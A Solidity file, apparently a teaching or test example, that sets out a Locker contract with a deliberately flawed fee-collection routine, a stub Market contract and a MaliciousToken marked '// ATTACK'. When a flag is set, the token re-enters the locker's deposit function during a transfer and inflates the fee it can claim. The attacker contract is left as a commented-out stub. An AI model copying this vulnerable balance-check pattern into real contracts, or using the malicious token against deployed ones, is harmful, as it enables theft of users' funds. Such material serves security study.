// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Simplified interface of the OpenZeppelin's IERC20 and SafeERC20 libraries for sake of example
interface IERC20 {
    function safeTransfer(address to, uint256 value) external;
    function safeTransferFrom(address from, address to, uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Locker {
    Market private market;
    mapping (address => uint) public deposited;

    constructor (address _market) {
        market = Market(_market);
    }

    function deposit(address token, uint amt) public {
        deposited[msg.sender] += amt;
        IERC20(token).safeTransferFrom(msg.sender, address(this), amt);
    }

    function withdraw(address token) public {
        uint amt = deposited[msg.sender];
        deposited[msg.sender] = 0;
        IERC20(token).safeTransferFrom(address(this), msg.sender, amt);
    }

    function collectFees(address token) public {
        uint n1 = IERC20(token).balanceOf(address(this));
        market.withdrawFee(token);
        uint n2 = IERC20(token).balanceOf(address(this));
        IERC20(token).safeTransferFrom(address(this), msg.sender, n2 - n1);
    }

}

contract Market {

    mapping (address => uint) public fees;
    // TODO add more fields to let the contract be more realistic

    function swap(/*TODO add params*/) public {
        // TODO this should be a function that generates fee
        fees[msg.sender] += 1;
    }

    function withdrawFee(address token) public {
        uint amt = fees[msg.sender];
        fees[msg.sender] = 0;
        IERC20(token).safeTransferFrom(address(this), msg.sender, amt);
    }
}

contract MaliciousToken is IERC20 {
    mapping (address => uint) public balances;
    bool public condition;
    Locker public locker;

    constructor(address _locker) {
        locker = Locker(_locker);
    }

    function safeTransfer(address to, uint amt) public {
        safeTransferFrom(msg.sender, to, amt);
    }

    function safeTransferFrom(address from, address to, uint amt) public {
        // ATTACK
        if (condition) {
            locker.deposit(address(this), amt);
        }
        balances[to] += amt;
        balances[from] -= amt;
    }

    function balanceOf(address a) public view returns (uint256){
        return balances[a];
    }

    function setCondition(bool _condition) public {
        condition = _condition;
    }
}

// contract Attacker {

//     function attack() public {
//         // TODO
//     }
// }